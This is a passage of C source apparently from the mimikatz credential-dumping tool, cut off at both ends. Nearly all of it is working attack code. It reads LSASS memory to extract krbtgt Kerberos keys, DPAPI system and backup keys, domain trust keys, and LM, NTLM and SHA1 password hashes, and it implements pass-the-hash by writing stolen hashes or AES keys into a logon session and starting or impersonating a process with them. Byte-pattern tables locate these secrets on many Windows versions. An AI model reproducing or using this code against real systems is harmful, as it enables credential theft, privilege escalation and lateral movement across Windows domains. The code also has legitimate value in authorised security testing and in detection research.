							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
							aLsass.address = creds6->credentials[i].key;
							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
							{
								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds6->credentials[i].size)))
									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds6->credentials[i].size), 0);
								LocalFree(aLocal.address);
							}
							kprintf(L"\n");
						}
					}
					LocalFree(creds6);
				}
			}
		}
		else
		{
			aLocal.address = &tmpCred64;
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
				{
					aLocal.address = creds64;
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						kprintf(L"%u credentials\n", creds64->cbCred);
						for(i = 0; i < creds64->cbCred; i++)
						{
							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
							aLsass.address = creds64->credentials[i].key;
							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds64->credentials[i].size)))
							{
								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds64->credentials[i].size)))
									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds64->credentials[i].size), 0);
								LocalFree(aLocal.address);
							}
							kprintf(L"\n");
						}
					}
					LocalFree(creds64);
				}
			}
		}
	}
}

#ifdef _M_X64
BYTE PTRN_WI52_SysCred[] = {0xb9, 0x14, 0x00, 0x00, 0x00, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
BYTE PTRN_WI60_SysCred[] = {0x48, 0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
BYTE PTRN_WN62_SysCred[] = {0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
KULL_M_PATCH_GENERIC SysCredReferences[] = {
	{KULL_M_WIN_MIN_BUILD_2K3,		{sizeof(PTRN_WI52_SysCred),		PTRN_WI52_SysCred},		{0, NULL}, { 21,  -4, 10}},
	{KULL_M_WIN_MIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, {-13, -19,  8}},
	{KULL_M_WIN_MIN_BUILD_7,		{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, { -7, -13,  8}},
	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-10, -19,  7}},
	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-27, -4,   7}},
	{KULL_M_WIN_MIN_BUILD_10,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-20, -26,  7}},
};
#elif defined _M_IX86
BYTE PTRN_WI51_SysCred[] = {0x00, 0xab, 0x33, 0xc0, 0xbf};
BYTE PTRN_WI52_SysCred[] = {0x59, 0x33, 0xd2, 0x88, 0x10, 0x40, 0x49, 0x75};
BYTE PTRN_WI60_SysCred[] = {0x6a, 0x14, 0x59, 0xb8};
BYTE PTRN_WI62_SysCred[] = {0x6a, 0x14, 0x5a, 0x8b, 0xf2, 0xb9};
BYTE PTRN_WI63_SysCred[] = {0x6a, 0x14, 0x59, 0x8b, 0xd1, 0xb8};
KULL_M_PATCH_GENERIC SysCredReferences[] = {
	{KULL_M_WIN_MIN_BUILD_XP,		{sizeof(PTRN_WI51_SysCred),		PTRN_WI51_SysCred},		{0, NULL}, { -4, -14,  5}},
	{KULL_M_WIN_MIN_BUILD_2K3,		{sizeof(PTRN_WI52_SysCred),		PTRN_WI52_SysCred},		{0, NULL}, { 27,  -4, 12}},
	{KULL_M_WIN_MIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, { 34,   4, 20}},
	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WI62_SysCred),		PTRN_WI62_SysCred},		{0, NULL}, { 36,   6, 17}},
	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WI63_SysCred),		PTRN_WI63_SysCred},		{0, NULL}, { 31,   6, 18}},
	{KULL_M_WIN_MIN_BUILD_10,		{sizeof(PTRN_WI63_SysCred),		PTRN_WI63_SysCred},		{0, NULL}, { 35,   6, 20}},
};
#endif
NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
{
	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	PKUHL_M_SEKURLSA_PACKAGE pPackage = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
	PVOID pBool = NULL, pShaSystem = NULL, pShaUser = NULL;
	BOOL fSystemCredsInitialized;
	BYTE origInit, rgbSystemCredMachine[SHA_DIGEST_LENGTH], rgbSystemCredUser[SHA_DIGEST_LENGTH];

	if(NT_SUCCESS(status))
	{
		if(pPackage->Module.isPresent)
		{
			origInit = pPackage->Module.isInit;
			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &pPackage->Module, SysCredReferences, ARRAYSIZE(SysCredReferences), &pBool, &pShaSystem, &pShaUser, NULL))
			{
				pPackage->Module.isInit = origInit; // trick to use same packages as normal module.
				aLocal.address = &fSystemCredsInitialized;
				aLsass.address = pBool;
				if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(fSystemCredsInitialized)))
				{
					if(fSystemCredsInitialized)
					{
						kprintf(L"DPAPI_SYSTEM\n");
						aLocal.address = &rgbSystemCredMachine;
						aLsass.address = pShaSystem;
						if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(rgbSystemCredMachine)))
						{
							aLocal.address = &rgbSystemCredUser;
							aLsass.address = pShaUser;
							if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(rgbSystemCredUser)))
							{
								kprintf(L"full: ");
								kull_m_string_wprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
								kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
								kprintf(L"\nm/u : ");
								kull_m_string_wprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
								kprintf(L" / ");
								kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
								kprintf(L"\n");
							}
						}
					}
					else PRINT_ERROR(L"Not initialized!\n");
				}
			}
			else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
		}
		else PRINT_ERROR(L"DPAPI service not in LSASS memory\n");
	}
	return status;
}

#ifdef _M_X64
BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
KULL_M_PATCH_GENERIC DomainListReferences[] = {
	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_DomainList),		PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {8}},
};
NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
{
	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
	PVOID buffer;
	KDC_DOMAIN_INFO domainInfo;
	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, data = {&buffer, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {&domainInfo, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_7)
	{
		if(NT_SUCCESS(status))
		{
			if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
			{
				if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, DomainListReferences, ARRAYSIZE(DomainListReferences), &aLsass.address, NULL, NULL, NULL))
				{
					if(kull_m_memory_copy(&data, &aLsass, sizeof(PVOID)))
					{
						data.address = buffer;
						data.hMemory = cLsass.hLsassMem;
						while(data.address != aLsass.address)
						{
							if(kull_m_memory_copy(&aBuffer, &data, sizeof(KDC_DOMAIN_INFO)))
							{
								kuhl_m_sekurlsa_trust_domaininfo(&domainInfo);
								data.address = domainInfo.list.Flink;
							}
							else break;
						}
					}
				}
				else PRINT_ERROR(L"Pattern not found in KDC service\n");
			}
			else PRINT_ERROR(L"KDC service not in LSASS memory\n");
		}
	}
	else PRINT_ERROR(L"Only for >= 2008r2\n");
	return status;
}

void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix, BOOL incoming, PCUNICODE_STRING domain)
{
	KULL_M_MEMORY_ADDRESS aLsass = {keysInfo->keys, cLsass.hLsassMem}, aData = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	DWORD i;
	PKDC_DOMAIN_KEYS domainKeys;

	if((keysInfo->keysSize && keysInfo->keys) || (keysInfo->password.Length && keysInfo->password.Buffer))
	{
		kprintf(L"\n  [%s] ", prefix);
		kprintf(incoming ? L"-> %wZ\n" : L"%wZ ->\n", domain);
		if(kull_m_process_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
		{
			kprintf(L"\tfrom: ");
			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
				kprintf(L"%wZ", &keysInfo->password);
			else kull_m_string_wprintf_hex(keysInfo->password.Buffer, keysInfo->password.Length, 1);
			LocalFree(keysInfo->password.Buffer);
		}
		kprintf(L"\n");

		if(keysInfo->keysSize && keysInfo->keys)
		{
			if(domainKeys = (PKDC_DOMAIN_KEYS) LocalAlloc(LPTR, keysInfo->keysSize))
			{
				aData.address = domainKeys;
				if(kull_m_memory_copy(&aData, &aLsass, keysInfo->keysSize))	
				{
					for(i = 0; i < domainKeys->nbKeys; i++)
					{
						kprintf(L"\t* %s : ", kuhl_m_kerberos_ticket_etype(domainKeys->keys[i].type));
						kull_m_string_wprintf_hex((PBYTE) domainKeys + domainKeys->keys[i].offset, domainKeys->keys[i].size, 0);
						kprintf(L"\n");
					}
				}
				LocalFree(domainKeys);
			}
		}
	}
}

void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
{
	if(kull_m_process_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
	{
		if(kull_m_process_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
		{
			kprintf(L"\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
			if(kull_m_process_getSid(&info->DomainSid, cLsass.hLsassMem))
			{
				kprintf(L" / "); kull_m_string_displaySID(info->DomainSid);
				LocalFree(info->DomainSid);
			}
			kprintf(L")\n");
			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, L" Out ", FALSE, &info->FullDomainName);	// Input keys are for Out relation ship...
			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, L"  In ", TRUE, &info->FullDomainName);
			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, L"Out-1", FALSE, &info->FullDomainName);
			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, L" In-1", TRUE, &info->FullDomainName);
			LocalFree(info->NetBiosName.Buffer);
		}
		LocalFree(info->FullDomainName.Buffer);
	}
}

void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, BOOL isExport)
{
	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass->hLsassMem}, aData = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	GUID guid;
	DWORD cb;
	PVOID pGuid, pKeyLen, pKeyBuffer;

	if(kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, generics, cbGenerics, &pGuid, &pKeyLen, &pKeyBuffer, NULL))
	{
		if(aLsass.address = pGuid)
		{
			aData.address = &guid;
			if(kull_m_memory_copy(&aData, &aLsass, sizeof(GUID)))
			{
				kull_m_string_displayGUID(&guid); kprintf(L"\n");
				if(aLsass.address = pKeyLen)
				{
					aData.address = &cb;
					if(kull_m_memory_copy(&aData, &aLsass, sizeof(DWORD)))
					{
						if(cb && (aLsass.address = pKeyBuffer))
						{
							aData.address = &aLsass.address;
							if(kull_m_memory_copy(&aData, &aLsass, sizeof(PVOID)))
							{
								if(aData.address = LocalAlloc(LPTR, cb))
								{
									if(kull_m_memory_copy(&aData, &aLsass, cb))
									{
										kuhl_m_lsadump_analyzeKey(&guid, (PKIWI_BACKUP_KEY) aData.address, cb, isExport);
									}
									LocalFree(aData.address);
								}
							}
						}
					}
				}
			}
		}
	}
	else PRINT_ERROR(L"Pattern not found in DPAPI service\n");
}

BYTE PTRN_WALL_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0x89, 0x05};
BYTE PTRN_W2K16_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0xe8};
KULL_M_PATCH_GENERIC BackupKeyReferences[] = {
	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  37,  44}},
	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  40,  47}},
	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  33,  40}},
	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  30,  37}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_BackupKey),			PTRN_W2K16_BackupKey},			{0, NULL}, {-10,  24,  31}},
};
BYTE PTRN_W2K3_BackupKeyCompat[]	= {0x45, 0x33, 0xc9, 0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xe8};
BYTE PTRN_W2K8_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd7, 0xe8};
BYTE PTRN_W2K8R2_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd6, 0xe8};
BYTE PTRN_W2K12_BackupKeyCompat[]	= {0x85, 0xc0, 0x74, 0x21, 0x4c, 0x8d, 0x05};
BYTE PTRN_W2K12R2_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0xe8};
BYTE PTRN_W2K16_BackupKeyCompat[]	= {0x85, 0xc0, 0x75, 0x1e, 0xe8};
KULL_M_PATCH_GENERIC BackupKeyReferencesCompat[] = {
	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_W2K3_BackupKeyCompat),		PTRN_W2K3_BackupKeyCompat},		{0, NULL}, {-4, -18, -11}},
	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_W2K8_BackupKeyCompat),		PTRN_W2K8_BackupKeyCompat},		{0, NULL}, {-4,  26,  33}},
	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_BackupKeyCompat),	PTRN_W2K8R2_BackupKeyCompat},	{0, NULL}, {-4,  20,  27}},
	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_W2K12_BackupKeyCompat),	PTRN_W2K12_BackupKeyCompat},	{0, NULL}, {21,   7,  14}},
	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_W2K12R2_BackupKeyCompat),	PTRN_W2K12R2_BackupKeyCompat},	{0, NULL}, {-4,  17,  24}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_BackupKeyCompat),	PTRN_W2K16_BackupKeyCompat},	{0, NULL}, {-9,  -23,  -16}},
};
NTSTATUS kuhl_m_sekurlsa_bkeys(int argc, wchar_t * argv[])
{
	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
	PKUHL_M_SEKURLSA_LIB pLib;
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);

	if(NT_SUCCESS(status))
	{
		pLib = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package.Module : &kuhl_m_sekurlsa_dpapi_lsa_package.Module;
		if(pLib->isPresent)
		{
			kprintf(L"\nCurrent prefered key:       ");
			kuhl_m_sekurlsa_bkey(&cLsass, pLib, BackupKeyReferences, ARRAYSIZE(BackupKeyReferences), export);
			kprintf(L"\nCompatibility prefered key: ");
			kuhl_m_sekurlsa_bkey(&cLsass, pLib, BackupKeyReferencesCompat, ARRAYSIZE(BackupKeyReferencesCompat), export);
		}
	}
	return status;
}
#endif

NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	TOKEN_STATISTICS tokenStats;
	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256, szLuid = NULL;
	DWORD dwNeededSize;
	HANDLE hToken, hNewToken;
	PROCESS_INFORMATION processInfos;
	BOOL isImpersonate;

	if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, NULL))
	{
		tokenStats.AuthenticationId.HighPart = 0; // because I never saw it != 0
		tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, NULL, 0);
	}
	else
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
			{
				isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
#pragma warning(push)
#pragma warning(disable:4996)
				kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
#pragma warning(pop)
				kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");

			}
			else PRINT_ERROR(L"Missing argument : domain\n");
		}
		else PRINT_ERROR(L"Missing argument : user\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
	{
		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
			{
				data.Aes128Key = aes128key;
				kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
			}
			else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
		}
		else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
	{
		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
			{
				data.Aes256Key = aes256key;
				kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
			}
			else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
		}
		else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
	{
		if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
		{
			data.NtlmHash = ntlm;
			kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		}
		else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
	}

	if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
	{
		if(szLuid)
		{
			kprintf(L"mode\t: replacing NTLM/RC4 key in a session\n");
			kuhl_m_sekurlsa_pth_luid(&data);
		}
		else if(szUser)
		{
			if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
			{
				kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
				if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
				{
					if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
					{
						kuhl_m_sekurlsa_pth_luid(&data);
						if(data.isReplaceOk)
						{
							if(isImpersonate)
							{
								if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
								{
									if(SetThreadToken(NULL, hNewToken))
										kprintf(L"** Token Impersonation **\n");
									else PRINT_ERROR_AUTO(L"SetThreadToken");
									CloseHandle(hNewToken);
								}
								else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
								NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
							}
							else NtResumeProcess(processInfos.hProcess);
						}
						else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
					}
					else PRINT_ERROR_AUTO(L"GetTokenInformation");
					CloseHandle(hToken);
				}
				else PRINT_ERROR_AUTO(L"OpenProcessToken");
				CloseHandle(processInfos.hThread);
				CloseHandle(processInfos.hProcess);
			}
			else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
		}
		else PRINT_ERROR(L"Bas user or LUID\n");
	}
	else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");

	return STATUS_SUCCESS;
}

VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
{
	OBJECT_BASIC_INFORMATION bi;
	ULONG szNeeded;
	HANDLE hTemp;
	NTSTATUS status;
	BOOL isRWok = FALSE;

	if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()) && (cLsass.hLsassMem->type == KULL_M_MEMORY_TYPE_PROCESS))
	{
		kprintf(L"  |  LSA Process ");
		status = NtQueryObject(cLsass.hLsassMem->pHandleProcess->hProcess, ObjectBasicInformation, &bi, sizeof(OBJECT_BASIC_INFORMATION), &szNeeded);
		if(NT_SUCCESS(status))
		{
			if(isRWok = (bi.GrantedAccess & (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))
				kprintf(L"was already R/W\n");
			else
			{
				if(hTemp = OpenProcess(bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, GetProcessId(cLsass.hLsassMem->pHandleProcess->hProcess)))
				{
					isRWok = TRUE;
					CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
					cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
					kprintf(L"is now R/W\n");
				}
				else PRINT_ERROR_AUTO(L"OpenProcess");

				//if(isRWok = DuplicateHandle(GetCurrentProcess(), cLsass.hLsassMem->pHandleProcess->hProcess, GetCurrentProcess(), &hTemp, bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, 0)) // FAIL :(
				//{
				//	CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
				//	cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
				//	kprintf(L"is now R/W\n");
				//}
				//else PRINT_ERROR_AUTO(L"DuplicateHandle");
			}
		}
		else PRINT_ERROR(L"NtQueryObject: %08x\n", status);

		if(isRWok)
		{
			kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
			kprintf(L"  \\_ msv1_0   - ");
			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
			kprintf(L"\n");
			kprintf(L"  \\_ kerberos - ");
			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
			kprintf(L"\n");
		}
	}
	else PRINT_ERROR(L"memory handle is not KULL_M_MEMORY_TYPE_PROCESS\n"); 
}

VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
{
	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
	PKERB_HASHPASSWORD_GENERIC pHashPassword;
	UNICODE_STRING buffer;
	DWORD type, i;
	BOOL isNull = FALSE;
	PWSTR sid = NULL;
	PBYTE msvCredentials;
	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
	PLSAISO_DATA_BLOB blob = NULL;

	if(mesCreds)
	{
		ConvertSidToStringSid(pData->pSid, &sid);
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
			if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)->Buffer)
			{
				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
					(*lsassLocalHelper->pLsaUnprotectMemory)(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length);

				switch(type)
				{
					case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
						pMSVHelper = kuhl_m_sekurlsa_msv_helper(pData->cLsass);
						kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain), FALSE);
						kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), FALSE);
						kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
						if(!pMSVHelper->offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisIso))
						{
							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
							{
								kprintf(L"\n\t * LM       : ");
								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
							}
							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
							{
								kprintf(L"\n\t * NTLM     : ");
								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
							}
							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
							{
								kprintf(L"\n\t * SHA1     : ");
								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
							}
							if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
							{
								kprintf(L"\n\t * DPAPI    : ");
								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
							}
							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
						}
						else
						{
							i = *(PUSHORT) (msvCredentials + pMSVHelper->offsetToIso);
							if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1607)
							{
								//kprintf(L"\n\t   * unkSHA1: ");
								//kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT), SHA_DIGEST_LENGTH, 0);	
